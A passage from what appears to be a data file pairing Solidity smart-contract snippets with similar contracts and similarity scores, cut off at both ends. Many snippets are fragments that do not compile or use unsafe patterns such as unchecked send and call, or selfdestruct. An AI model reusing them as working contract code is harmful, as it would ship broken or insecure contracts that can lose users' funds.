  onlyAdmin 
  {
    adminRole.add(account);
    emit LogAdminRoleAdded(account);
  }
}",0.6826671138632531,"contract DelegateRole {
    using Roles for Roles.Role;

    event DelegateAdded(address indexed account);
    event DelegateRemoved(address indexed account);

    Roles.Role private _delegates;

    function _addDelegate(address account) internal {
        _delegates.add(account);
        emit DelegateAdded(account);
    }

    function _removeDelegate(address account) internal {
        _delegates.remove(account);
        emit DelegateRemoved(account);
    }

    function _hasDelegate(address account) internal view returns (bool) {
        return _delegates.has(account);
    }
}"
"contract NewCoin is ERC20Mintable {

  constructor() public {

  }
}",0.6933767679367202,"contract DxReputation is Reputation {
    constructor() public {}
}"
"contract A {
  function() {
    doStuff();
  }
}",0.6922662711955618,"contract MSD6 {

    

    function() public {

        

    }

}"
"contract Signed1 {
        uint val= 0;
        function withdrawOnce(int amount) public returns (uint){
           revert();
        }
        msg.sender.transfer(uint(amount));
        transferred[msg.sender] = true;

    }",0.6342689763742513,"contract token{



    function transfer(address receiver, uint amount) public;

    function balanceOf(address receiver) constant public returns (uint balance);

}"
"contract CareerCertificate {

struct Certificate {

    bytes32 a;
    bool b;
    uint c;

    bytes32 d;
    bytes32 e;
    bytes32 f;
    bytes32 g;
    bytes32 h;


    bytes32 i;
    bytes32 j;
    bytes32 k;

    uint l;
    uint m;

    bool active;
}


address public ceoAddress;
address public employee;

mapping (bytes32 => Certificate) public certificates;

event CertificateCreated(address creator, string id, string RUT);
event SetActive(address responsable, string id, bool active, string description);

constructor() public {
    ceoAddress = msg.sender;
}


function createCertificate(string _a, uint _date, string _completeName, string _RUT, string _institution, string _RutInstition, string _title, string _FechaTitulacion, 
string _NroRegistro, string _CodigoVerificacion, uint _completionDate, uint _registerNumber) onlyEmployees {

    bytes32 realId = convert(_a);
    require(!certificateExists(_a));
    certificates[realId].a = a;",0.6495325816910642,"contract Echos is AccessControl {

    struct Certificate {
        string name;
        string email;
        string course;
        string dates;
        uint16 courseHours;
        bool valid;
    }
    
    mapping (bytes32 => Certificate) public certificates;
    event logPrintedCertificate(bytes32 contractAddress, string _name, string email, string _course, string _dates, uint16 _hours);

    function printCertificate (string _name, string _email, string _course, uint16 _hours, string _dates) public canAccess(3) whenNotPaused returns (bytes32 _certificateAddress) {

        
        bytes32 certificateAddress = keccak256(block.number, now, msg.data);

        
        certificates[certificateAddress] = Certificate(_name, _email, _course, _dates, _hours, true);
        
        
        logPrintedCertificate(certificateAddress, _name, _email, _course, _dates, _hours);

        return certificateAddress;
    }
    
    
    function invalidateCertificate(bytes32 _certificateAddress) external canAccess(3) {
        certificates[_certificateAddress].valid = false;
    }

}"
"contract C { 
 function pay(uint n, address d){ 
    d.send(n);  
 } 
}",0.651124121815504,"contract Token{
  function transfer(address to, uint value);
}"
"contract CustTest {
    mapping(address  => address) public customers;  
    function createProfile()
        public
    {
    customers[msg.sender] = new CustList();
    }
}",0.6228898753644863,"contract MainSale {
  address public multisigVault;
  uint public altDeposits;
  function createTokens(address recipient) payable;
}"
"contract InterfaceCardToDefense {
function AttackPosition2Defense(int, int) public returns(int);
}",0.6387476468005799,"contract FiatContractInterface {

    function EUR(uint _id) public constant returns (uint256);

}"
"contract Election {
    
    address public chairman;

    constructor () public {
      chairman = msg.sender;
    }

    function register() public payable{
        chairman.transfer(1.0);
    }
}",0.6388190184900046,"contract SokolCrowdsale is Token {



    constructor() public payable Token() {}

    

    function withdraw() public onlyOwner {

        owner.transfer(address(this).balance);

    }

}"
"contract Myfirstcontract 
{
    string private name;
    uint private age;

    function setName (string newName)
    {
        name = newName;
    }

    function getName () returns (string)
    {
        return name;
    }

    function setAge (uint newAge)
    {
        age = newAge;
    }

    function getAge () returns (uint)
    {
        return age;
    } 


}",0.6344025699608077,"contract ERC223 is ERC20 {



    function name() constant returns (string _name);

    function symbol() constant returns (string _symbol);

    function decimals() constant returns (uint8 _decimals);



    function transfer(address to, uint256 value, bytes data) returns (bool);



}"
"contract MyLogicV1 {
  uint256 public foo;
  
}",0.6751693723592527,"contract CoinI{
    
    uint256 public totalSupply ;
}"
"contract Contract{
  address minter;
  uint gid;

  

  
  function Contract(){
    minter=msg.sender;
    gid=0;
  }
  function kill(){
    if (msg.sender == minter){
      suicide(minter);
    }
  }

  function createAgreement(string name){
      
      

      gid++;   
  }",0.6341181846163457,"contract Doubler
{
    address owner;

    function Doubler() payable
    {
        owner = msg.sender;
    }
    
    function() payable{
        
        if (!msg.sender.call(msg.value*2))
            revert();
    }
    
    function kill()
    {
        if (msg.sender==owner)
            suicide(owner);
    }
}"
"contract C{
  struct Person{
    string name;
    mapping(address=>int) map;
    string[] nickNames;
    int age;
  }

  function init() constant returns (string, int){
    string[] memory nickNames = new string[](1);
    nickNames[0] = ""cat1099"";

    Person memory p = Person(""Jack"", nickNames, 23);

    return (p.name, p.age);
  }
}",0.6073127146092209,"contract RobetTest {

    string public name;

    mapping (address => mapping (string => uint256)) private bets;

    constructor()  public {

        name = 'RobetTest';

    }

    function insertBet(string memory bid, address addr, uint256 _value) public returns (bool success) {

        bets[addr][bid] = _value;

        return true;

    }

}"
"contract Getter_check {
   uint public data = 50;
   function f() constant returns (uint r)
   {
       r = data;
   }
}",0.6993279063741016,"contract Counter {
  uint i=1;
  function inc() {
    i=i+1;
  }
  function get() constant returns (uint) {
    return i;
  }
}"
"contract DonationContract
{
    address owner;

    struct Applicant
    {
        address Org;
        string Name;
        string OrgType;
        string Number;
        string Email;
        uint256 Wallet;
        uint256 DonationFunds;
        bool approved;
    }

    constructor() public 
    {
        owner = msg.sender;
        facilitators[msg.sender] = true;
    }

    mapping (address => Applicant) public applicants;

    mapping(address => bool) facilitators;

    modifier Owner() 
    {
        require(msg.sender == owner);
        _;
    }

    modifier OnlyFacilitator()
    {
        require(facilitators[msg.sender] == true);
        _;
    }

     modifier Approved(address Org) 
    {
        require(applicants[Org].approved == true);
        _;
    }

    function approve(address Org) OnlyFacilitator public
    {
        applicants[Org].approved = true;
    }

      function Donate(uint256 amount, address Org) Approved(Org)  public
    {
        if(Org==0)
        {
            
        }
        else
        applicants[Org].DonationFunds += amount;

        if(applicants[Org].DonationFunds >= 10000)
        {
            applicants[Org].DonationFunds -=10000;
            applicants[Org].Wallet += 10000;
        }
    }

     function addFacilitator(address _addr) Owner public
    {
        facilitators[_addr] = true;
    }
}",0.6026535334842028,"contract GangToken is MintableToken {

  string public constant name                 = ""gangFY"";
  string public constant symbol               = ""GNGFY"";
  uint public constant decimals               = 18;
    
  
  bool public paused = false;
  uint256 public cap = 2000000000 ether;

  constructor() public {
    
    
    
    
  }
    
  event Burn(address indexed burner, uint256 value);
    
  
    
  function burn(uint256 _value) public {
    balances[msg.sender] = balances[msg.sender].sub(_value);
    totalSupply_ = totalSupply_.sub(_value);

    emit Burn(msg.sender, _value);
    emit Transfer(msg.sender, address(0), _value);
  }

  
  address public multisig;

  function setupMultisig (address _address) public {
    require (multisig == address(0));
    multisig = _address;
  }

  modifier onlyMultisig() { 
    require (msg.sender == multisig); 
    _;
  }
  
  function mint(address _to, uint256 _amount) onlyMultisig public returns (bool) {
    require(totalSupply_.add(_amount) <= cap);
    super.mint(_to, _amount);
  }

  function finishMinting() onlyMultisig public returns (bool) {
    super.finishMinting();
  } 
}"
"contract Relay{
address public currentVersion;
address public relayowner;

constructor (address initAddr) public {
    currentVersion = initAddr;
    relayowner = msg.sender;
}

modifier onlyOwnerUse() {
    require(msg.sender == relayowner);
    _;
}

function changeContract(address newVersion) public
onlyOwnerUse() {
    currentVersion = newVersion;
}

 

function() external {
  (bool b,)=currentVersion.call(msg.data);
  require(!b);
}

}",0.6685238331470881,"contract Ownable {
    address payable public owner;
    address payable internal newOwnerCandidate;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function changeOwner(address payable newOwner) public onlyOwner {
        newOwnerCandidate = newOwner;
    }

    function acceptOwner() public {
        require(msg.sender == newOwnerCandidate);
        owner = newOwnerCandidate;
    }
}"
"contract Test {

    uint public number = 10;

    function setNumber(uint _x) public returns (uint)
    {
        number = number+_x;

        return number + 5;
    }

    function GetNumber() public view returns (uint)
    {
        return number;
    }
}",0.6471480889536573,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract Randomness is usingNRE {

   function randomNumber() public view returns (uint256){

       return (uint256(keccak256((rw()/(10**20))%(10**12))));
   }

}",0.6466218157395472,"contract Halo3D {



   

    function transfer(address, uint256) public returns(bool);

    function balanceOf() public view returns(uint256);

  

   

}"
"contract SimpleContract {
  bytes32  hello = ""hello"";
  function getHello() public view returns (bytes32){
    return hello;
  }
}",0.6608115945692163,"contract DSValue {

    

    function peek() public view returns (bytes32, bool);



    function read() public view returns (bytes32);

}"
"contract A
{
  address contractb = 
  function first() public
  {
    contractb.call.value(1 ether)();
  }
}",0.6630707267736109,"contract AddressList {
    function contains(address addr) public constant returns (bool);
}"
"contract B
{
  address contractc = 
  function () public payable
  {
    if(contractc.value(msg.value)())
    {
      assembly { invalid } 
    }
  }
}",0.6202154879062821,"contract ResolverClient {

  

  

  

  function get_contract(bytes32 _key) public constant returns (address _contract);

}"
"contract secondContract is firstContract {
...
}",0.6984872662031322,"contract MyContract {
    
    function MyContract() {

    }
}"
"contract test { 
    uint256 public a;
    uint256 public b;
    uint256 public c;

    function nestedSum (uint256 d) public
    {
        a = (b = (c = d + 3) + 12) + 22;
    }
}",0.674324292614981,"contract SafeMath {

	function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

		uint256 c = a + b;

		assert(c >= a && c >= b);



		return c;

	}

}"
"contract returnbalance{
    function returnsenderbalance() constant returns (uint){
        return msg.sender.balance;  
    }
}",0.6653476272696225,"contract Balance {

    function getBalance(address a) public view returns (uint) {

        return a.balance;

    }

}"
"contract ContractA {
    constructor (uint _id) public {} 
}",0.6912921530306658,"contract Popo is WithdrawPopo {

  

  constructor()

    public 

  {



  }

  

}"
"contract FundRaiser {
  
  uint256 public goal;
  uint256 public minimumContribution;
  address public owner;

  constructor(uint256 _goal, uint256 _minimumContribution) public {
    goal = _goal;
    minimumContribution = _minimumContribution;
    owner = msg.sender;
  }
}",0.6106612620241657,"contract Contract {

  struct Contributor {

    uint256 balance;

    uint256 balance_bonus;

    uint256 fee;

    bool whitelisted;

  }

  mapping (address => Contributor) public contributors;

  uint256 public contract_eth_value;

  uint256 public contract_eth_value_fee;

}"
"contract B {
function verifAtt(uint idRequiredData, uint P, address userAddress) public returns (bool answer){
    answer=false;
    if(P==1) {
                bytes4 sig = bytes4(keccak256(""verifyUser(address)""));
                assembly {
                    
                    let ptr := mload(0x40)
                    
                    mstore(ptr,sig)
                    
                    mstore(add(ptr,0x04), userAddress)

                    let result := call(
                      15000, 
                      sload(dc), 
                      0, 
                      ptr, 
                      0x24, 
                      ptr,  
                      0x20) 
                    if eq(result, 0) {
                       revert(0, 0)
                    }
                    answer := mload(ptr) 
                    mstore(0x40,add(ptr,0x24)) 
                }
            }
        }
return answer
}",0.6071217530054366,"contract Proxy {

  

  function implementation() public view returns (address);



  

  function () payable public {

    address _impl = implementation();

    require(_impl != address(0));



    assembly {

      let ptr := mload(0x40)

      calldatacopy(ptr, 0, calldatasize)

      let result := delegatecall(gas, _impl, ptr, calldatasize, 0, 0)

      let size := returndatasize

      returndatacopy(ptr, 0, size)



      switch result

      case 0 { revert(ptr, size) }

      default { return(ptr, size) }

    }

  }

}"
"contract CustomToken is ERC20 {

    public symbol = TEST
    public totalSupply = X;
    public balanceOf...

    
    

    
    function placeOrderBuy(int _amountToken, int _maxPrice ) external payable 
            returns(bool success); 

    
    function placeOrderSell(int _amountToken, int _minPrice ) external 
            payable returns(bool success); 

    
    executeOrders() private returns(float newPrice);

    
    transfer(address _to, uint _value) private returns(bool success);
}",0.6378534091484902,"contract IRntToken {
    uint256 public decimals = 18;

    uint256 public totalSupply = 1000000000 * (10 ** 18);

    string public name = ""RNT Token"";

    string public code = ""RNT"";


    function balanceOf() public constant returns (uint256 balance);

    function transfer(address _to, uint _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint _value) public returns (bool success);
}"
"contract MyContract {
    constructor() public payable {
        Test test = new Test();
    }
}",0.6639711814953274,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract B{
   function callA(){
   A a = A(the_addr_of_A);
   a.set(100);
   }
}",0.6077821440084346,"contract Caller {
    function callAddress(address a) {
        a.call();
    }
}"
"contract Parent {
...
}",0.6848075777090852,"contract Ballot {


    
}"
"contract Child is Parent {
...
}",0.6697841626070293,contract Gold is ERC20 {}
"contract SimpleAuction {
  uint public auctionStart;
  uint public biddingTime;
}",0.6136106263747179,"contract StarAuction {

    address public highestBidder;

    bool public ended;

}"
"contract A {

    function transferAndCall(address _to, uint256 _value, bytes _data)
        external
        returns (bool) 
    {
        require(_to != address(0));
        require(canAcceptTokens_[_to] == true);     
        require(transfer(_to, _value));             

        if (isContract(_to)) {
            B receiver = B(_to);
            require(receiver.tokenFallback(msg.sender, _value, _data));
        }

        return true;
    }
}",0.6320702917721862,"contract Withdrawable is Ownable {

    function withdrawEther(address _to, uint _value) onlyOwner public {

        require(_to != address(0));

        require(address(this).balance >= _value);



        _to.transfer(_value);

    }



    function withdrawTokens(ERC20 _token, address _to, uint256 _value) onlyOwner public {

        require(_token.transfer(_to, _value));

    }



}"
"contract B {

    function tokenFallback(address _from, uint256 _value, bytes _data)
        onlyTokenContract()
        external
        returns (bool)
    {
        
        tokenBalanceLedger_[_from] = SafeMath.add(tokenBalanceLedger_[_from], _value);
        tokenSupply_ = SafeMath.add(tokenSupply_, _value);

        return true;
    }
}",0.6291632755850124,"contract Bitpara is BurnableToken {

    

  function transferToOwner(address _from, uint256 _value) onlyOwner public returns (bool) {
    balances[_from] = balances[_from].sub(_value);
    balances[owner] = balances[owner].add(_value);
    Transfer(_from, owner, _value);
    return true;
  }
}"
"contract SupplyChain is Users{

mapping (uint => Item) items;

 struct Item {
    uint    sku;  
    uint    upc; 
    address ownerID;
}
function pfunc(uint _upc, address _owner) public onlyManufacturer(msg.sender) view returns(address){
    return _owner;
  }",0.6458657519867027,"contract EstateToken is AbstractToken {

  mapping (address => uint256) internal accounts;

  function transfer (address _to, uint256 _value) public returns (bool);

  function balanceOf (address _owner) public view returns (uint256 balance);

}"
"contract TokenSeller {

  modifer enforceSale(uint256 amount) {
    ERC20 t = token();
    uint256 beforeBalance = t.balanceOf(msg.sender);
    _;
    uint256 afterBalance = t.balanceOf(msg.sender);
    require(afterBalance == beforeBalance + amount);
  }

  function buyToken(uint256 amount) public enforceSale(amount) returns(uint256);

  function token() public returns(ERC20);
}",0.6166337742831698,"contract MyToken {

    

    mapping (address => uint256) public balanceOf;



    

    function MyToken(

        uint256 initialSupply

        ) public {

        balanceOf[msg.sender] = initialSupply;              

    }



    

    function transfer(address _to, uint256 _value) public {

        require(balanceOf[msg.sender] >= _value);           

        require(balanceOf[_to] + _value >= balanceOf[_to]); 

        balanceOf[msg.sender] -= _value;                    

        balanceOf[_to] += _value;                           

    }

}"
"contract white_label {

    uint currentId = 1;

    function uploaded() public returns(uint){
        currentId++;
        return(currentId - 1);
    }
}",0.6250980436269004,"contract Test {

    uint public constant m = 1001001001;

    

    function sss() view public returns(uint) {

        return m;

    }

}"
"contract Accounting{
AccountingToken instance=AccountingToken(0x000...);

function get_balance()public view returns(uint){
        uint balance;
        balance=instance.balanceOf(msg.sender);
        return balance;
    }
function transfer_to_contract(uint tokens)public{
        address receiver=0x..receiver_address;
        instance.transfer(receiver,tokens);
}
}",0.6332073841285185,"contract Token {

  function balanceOf(address tokenOwner) public view returns (uint balance);

  function transfer(address to, uint tokens) public returns (bool success);

  function allowance(address tokenOwner, address spenderContract) public view returns (uint remaining);

}"
"contract sec
{

    uint age= 15;
    uint agePer;

    modifier onlyPer (){

        if(age==agePer)
        {
            _;
        }
    }

    function getage(uint agep) onlyPer() public returns (uint){

        agePer=agep;
        return agePer;
    }
}",0.6139365876148055,"contract Zhtong {
    address public owner;
      uint private result;
      function Set(){
          owner = msg.sender;
      }
      function assign(uint x, uint y) returns (uint){
          result = x + y;
      }
}"
"contract contractA {
    function() {
        for(uint i = 0;i<10; ++i)
            msg.sender.send(msg.value/10);
    }
}",0.6403567095243837,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract foo {
    uint public number = 42;
    function set(uint num)
    {
        number = num;
    }
}",0.631154902710829,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract SomeContract {

   getTokenBalance(address tokenAddress, address owner) returns (uint){
      ERC20 erc = ERC20(tokenAddress);
      return erc.balanceOf(owner);
   }

}",0.6117662079093649,"contract DAO {
    function balanceOf(address addr) returns (uint);
    function transferFrom(address from, address to, uint balance) returns (bool);
}"
"contract payontime{
  address public remitter;
  address private remittee;
  uint value;
  bool public start;

  
  modifier onlyOwner(){
    if(msg.sender != remitter) throw;
    _;
  }

  
  function payontime(address receiver) payable{
    remitter = msg.sender;
    value = msg.value;
    remittee = receiver;
    start = true;
    if(!remittee.send(value)){
        throw;
    }
  }

  function wakeUp() public returns (string){
    return ""success"" ; 
  }

  function getContractAddr() public returns(address){
    return this;
  }

  
  function getRemitee() public returns(address){
    return remittee;
  }
}",0.6488203828079258,"contract generic_holder {
    address owner;
    
    modifier onlyowner {
        if (owner == msg.sender)
            _;
    }
    
    
    function generic_holder() {
        owner = msg.sender;
    }
    
    function change_owner(address new_owner) external onlyowner {
        owner = new_owner;
    }
    
    function execute(address _to, uint _value, bytes _data) external onlyowner returns (bool){
        return _to.call.value(_value)(_data);
    }

    function send(address _to, uint _value) external onlyowner returns (bool){
        return _to.send(_value); 
    }
    
    function get_owner() constant returns (address) {
        return owner;
    }
    
}"
"contract testFallback  {
    address payable public addr = 0x...;
    receive() external payable {
        if (msg.value > 0) {
            if (!addr.send(address(this).balance)) revert();
        }
    }
}",0.6600205493844012,"contract mile{

     function receiveEther() payable public{
     }

     function sendEther(address _address) payable public{
         uint value = 0;

         _address.transfer(value);
     }

}"
"contract Crowdsale {
    MintableToken public token = new MintableToken();
    uint256 public someInt     = theValueIWouldPassAsConstrArgument;
    [...]

    function Crowdsale (){

    }",0.6441636687972228,"contract SampleCrowdsale is MintedCrowdsale {
  constructor(uint256 _rate, address _wallet, MintableToken _token) 
  public Crowdsale(_rate, _wallet, _token){}
}"
"contract FactroyContract {
  address[] public contracts;
  address public lastContractAddresses;

  event newPurchaseContract (address contractAddress);

  function getContractcount() public view returns(uint ContracCount) 
  {
    return contracts.length;
  }

  function newPurchase(uint value, string memory bookName, string memory description, string memory imageHash, string memory privHash, string memory dataHash) 
    public 
    payable
    returns(address NewContract)
  {
    Purchase c = new Purchase(address(msg.sender), value, bookName, description, imageHash, privHash, dataHash);
    contracts.push(c);
    lastContractAddresses = address(c);
    emit newPurchaseContract(c);
    return c;
  }

  function seePurchase(uint pos) public view returns(address contractAddress)
  {
    return address(contracts[pos]);
  }
}",0.6135505128600061,"contract Proxy is Role {



    event Upgraded(address indexed implementation);



    address internal _linkedContractAddress;



    function implementation() public view returns (address) {

        return _linkedContractAddress;

    }



    function upgradeTo(address newContractAddress) public administerAndAbove {

        require(newContractAddress != address(0));

        _linkedContractAddress = newContractAddress;

        emit Upgraded(newContractAddress);

    }



    function () payable public {

        address _implementation = implementation();

        require(_implementation != address(0));

        bytes memory data = msg.data;



        assembly {

            let result := delegatecall(gas, _implementation, add(data, 0x20), mload(data), 0, 0)

            let size := returndatasize

            let ptr := mload(0x40)

            returndatacopy(ptr, 0, size)

            switch result

            case 0 { revert(ptr, size) }

            default { return(ptr, size) }

        }

    }

}"
"contract Purchase
{
  uint public price;
  address public seller;
  address[] public buyers;
  address public buyer;
  string public ipfsHash;
  string public preview;
  string public cover;
  string public name;
  string public text;

  constructor(address contractSeller, uint value, string memory bookName, string memory description, string memory imageHash, string memory privHash, string memory dataHash) public payable
  {
    seller = contractSeller;
    name = bookName; 
    text = description;
    cover = imageHash;
    preview = privHash;
    ipfsHash = dataHash;
    price = value * 1000000000000000000;
  }

  modifier condition(bool _condition) 
  {
    require(_condition);
    _;    
  }

  modifier onlyBuyer()
  {
    (msg.sender == buyer);
    _;
  }

  modifier onlySeller()
  {
    (msg.sender == seller);
    _;
  }

  event ItemReceived();

  function confrimReceived() public 
    condition(msg.value == price)
    payable
  {
    emit ItemReceived();

    buyer = msg.sender;
    seller.transfer(address(this).balance);
  }
  function getBuyerCount() public view returns(address buyerAddresses)
  {
    return buyers.length;
  }

  function getEtherCount() public view return(uint earnedEather)
  {
    return price+= msg.value;
  }
}",0.6241533200183066,"contract OneToken {

    uint256 public currentHodlerId;

    address public currentHodler;

    address[] public previousHodlers;

    

    string[] public messages;

    uint256 public price;

    

    event Purchased(

        uint indexed _buyerId,

        address _buyer

    );



    mapping (address => uint) public balance;



    constructor() public {

        currentHodler = msg.sender;

        currentHodlerId = 0;

        messages.push(""Sky is the limit!"");

        price = 8 finney;

        emit Purchased(currentHodlerId, currentHodler);

    }



    function buy(string message) public payable returns (bool) {

        require (msg.value >= price);

        

        if (msg.value > price) {

            balance[msg.sender] += msg.value - price;

        }

        uint256 previousHodlersCount = previousHodlers.length;

        for (uint256 i = 0; i < previousHodlersCount; i++) {

            balance[previousHodlers[i]] += (price * 8 / 100) / previousHodlersCount;

        }

        balance[currentHodler] += price * 92 / 100;



        price = price * 120 / 100;  

        previousHodlers.push(currentHodler);

        messages.push(message);

        

        currentHodler = msg.sender;

        currentHodlerId = previousHodlersCount + 1;

        emit Purchased(currentHodlerId, currentHodler);

    }



    function withdraw() public {

        uint amount = balance[msg.sender];

        balance[msg.sender] = 0;

        msg.sender.transfer(amount);

    }

}"
"contract interaction_1 {
    function user_input (string memory team_1)public payable;
    function get_user_input()public returns(string memory);
}",0.6426568433747247,"contract CoinMarketCapApi {

    function requestPrice(string _ticker) public payable;

    function _cost() public returns (uint _price);

}"
"contract IDFactory is Ownable {

    Whitelisted whitelist;

    event IDCreated(uint id, address idContractAddress);

    mapping (uint => address) public ids;

    modifier idExists(uint id) {
      require(ids[id]);
      _;
     }
      constructor() public {
        owner = msg.sender;
        whitelist = new Whitelisted(owner);
        whitelist.addToWhitelist(owner);
    }
}",0.6484575952306428,"contract WhiteL is Ownership {	

    

    mapping (address => bool) public whitelist;



	event Whitelist(address indexed participant);

	

	modifier onlyIfAllowed {

        require(whitelist[msg.sender]);

        _;

    }	

	function verifyParticipant(address participant) external onlyManagingWallets {

        whitelist[participant] = true;

        Whitelist(participant);

    }

}"
"contract Bank{
uint balance;
address owner;

event deposited(address from, string msg);
event withDrawn(address from, string msg);

function deposit(uint amount){
    balance = balance + amount;
    deposited(msg.sender, ""Amount has been deposited successfully"");
}

function withDraw(uint amount){
    if(amount >= balance){
        throw;
    }
    else{
        balance = balance - amount;
        withDrawn(msg.sender, ""Amount has been withdrawn successfully"");
    }
}

function getBalance()constant returns (uint){
    return balance;
}",0.6411233752631724,"contract Bank is DSMath {

  mapping(address => uint) public balances;



  function deposit() public payable returns (uint balance) {

    balances[msg.sender] = add(balances[msg.sender], msg.value);

    return balances[msg.sender];

  }



  function withdraw(uint amount) public returns (uint remainingBalance){

    require(min(amount,balances[msg.sender]) == amount);

    balances[msg.sender] = sub(balances[msg.sender],amount);

    msg.sender.transfer(amount);

    return balances[msg.sender];

  }



  function balance() view public returns (uint) {

    return balances[msg.sender];

  }

}"
"contract C {
    mapping(string => mapping(address => uint)) public balances;
    string[] public tokennames; 
    mapping(string => uint) public tokennameIndex;
}",0.6559847250722914,"contract StandardTokenData {



    

    mapping (address => uint) balances;

    mapping (address => mapping (address => uint)) allowances;

    uint totalTokens;

}"
"contract Sample {
    constructor() internal {}
}",0.6244289628517993,"contract BlankContract {
    constructor() public {}
}"
"contract simpleAuction{
    uint currentValue = 0;
    address buyer;

    function set() public payable{
        uint sent = msg.value;
        require(sent>currentValue, ""Bid less than current value."");

        buyer.transfer(currentValue);

        currentValue = sent;
        buyer = msg.sender;
    }

    function winner() public view returns (address addressWinner, uint newValue){
        addressWinner = buyer;
        newValue = currentValue;
    }
}",0.6320869993828002,"contract ERC20 is ERC20Interface{



    function allowance(address owner, address spender) public view returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve (address spender, uint value) public returns (bool);

    event Approval (address indexed owner, address indexed spender, uint value);



}"
"contract myContract
{
    struct abc {
        uint8[] m;
        uint a ;
    }

    function myFucn() returns(bool)
    {
        abc storage b;   
        abc memory a;
        delete a;
        delete b; 
        return true;
    }
}",0.6030184813450897,"contract Token {
    function balanceOf(address a) returns (uint) {
        (a);
        return 0;
    }

    function transfer(address a, uint val) returns (bool) {
        (a);
        (val);
        return false;
    }
}"
"contract Factory {
    address[] public newContracts;

    function createContract (string memory name) public{
        address newContract = address(new MyContract(name));
        newContracts.push(newContract);
    } 
}",0.6211565406727112,"contract IContractRegistry {

    function addressOf(bytes32 _contractName) public view returns (address);



    

    function getAddress(bytes32 _contractName) public view returns (address);

}"
"contract caller{

    callee c;

    constructor() public
    {
        c = new callee();
    }

    function get() public view returns (uint k)
    {
        return c.get();
    }

    function set(uint k) public
    {
        c.set(k);
    }

    function get_calle() public view returns (callee)
    {
        return c;
    }


}",0.6627920784336376,"contract SaiTub {
    function tab(bytes32 cup) public returns (uint);
    function rap(bytes32 cup) public returns (uint);
    function din() public returns (uint);
    function chi() public returns (uint);
    function rhi() public returns (uint);
}"
"contract SubToken{
    using SafeMath for uint;

    struct token{ 
        string  name; 
        string   symbol; 
        uint8  decimals; 
        uint  totalSupply;  
    }

    token public mytokens;

    mapping(address => token) Tokens;
    mapping(address => uint) balances;

    constructor(string memory _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply)  public{  
        mytokens = token(_name,_symbol,_decimals,_totalSupply);
        balances[msg.sender]=_totalSupply;  
    }

    function getInformations(address contract_address) public view returns(string memory name,string memory symbol,uint8 decimals,uint totalSupply){
        return (Tokens[contract_address].name,Tokens[contract_address].symbol,Tokens[contract_address].decimals,Tokens[contract_address].totalSupply);
    }

    
    
    
    
    

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

}",0.6697719021193423,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 totalSupply_;

  string public name;

  string public symbol;

  uint8 public decimals;



  constructor(string _name, string _symbol, uint8 _decimals,uint256 totalSupply) public {

    

    balances[msg.sender] = totalSupply;

    totalSupply_ = totalSupply;

    name = _name;

    symbol = _symbol;

    decimals = _decimals;

  } 

  

  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    

    require(_to != address(0));

    require(_value <= balances[msg.sender]);

    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256) {

    return balances[_owner];

  }



}"
"contract MainContract {
    mapping(address => mapping(address=>uint)) balances;

    mapping(address => mapping(address => uint)) allowed;

    address[] public contracts;

    using SafeMath for uint;

    address contract_address;

    struct token{ 
        string  name; 
        string   symbol; 
        uint8  decimals; 
        uint  totalSupply;  
    } 
    mapping(address => token) public tokens;

    function createNewContract(string memory _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply) public returns(address youraddress){ 
        SubToken st = new SubToken(_name,_symbol,_decimals,_totalSupply);
        tokens[address(st)] = token(_name,_symbol,_decimals,_totalSupply);
        return(address(st));
    } 


    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",0.6860342966949964,"contract IERC20Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _value)  public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value)  public returns (bool success);
    function approve(address _spender, uint256 _value)  public returns (bool success);
    function allowance(address _owner, address _spender)  public constant returns (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}"
"contract Proxy {    
    address public _currentImplementation;

    constructor(address _initialImplementation) 
    public
    {
        _currentImplementation = _initialImplementation;
    }   

    function () 
    payable 
    public 
    {
        bool callSuccess = _currentImplementation.delegatecall(msg.data);
        if (callSuccess) {
            assembly {
                returndatacopy(0x0, 0x0, returndatasize)
                return(0x0, returndatasize)
            }
        } else {
            revert();
        }       
    }
}",0.6050377178160626,"contract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy {
    
    function initialize(address _logic, bytes memory _data) public payable {
        require(_implementation() == address(0));
        assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(""eip1967.proxy.implementation"")) - 1));
        _setImplementation(_logic);
        if (_data.length > 0) {
            (bool success, ) = _logic.delegatecall(_data);
            require(success);
        }
    }
}"
"contract SampleData {
    address owner1;
    constructor  (address  _owners) public 
    {
        
      owner1 = _owners;
    }        
}",0.6723007209236478,"contract Ownable {

    

    address public owner = 0x0;

    

    constructor() public {

        owner = msg.sender;

    }

}"
"contract FirstContract
{
    address creator;
    uint256 priceOfATransaction = msg.value;
    uint256 totalAmount;
    address buyer;

    function FirstContract() public
    {
        creator = msg.sender;
    }

    function perSaleDetails() public
    {
        totalAmount += priceOfATransaction;
        
        priceOfATransaction = 0;
    }

    function sellerMoneey() public returns(bool)
    {
        if(msg.sender == creator){
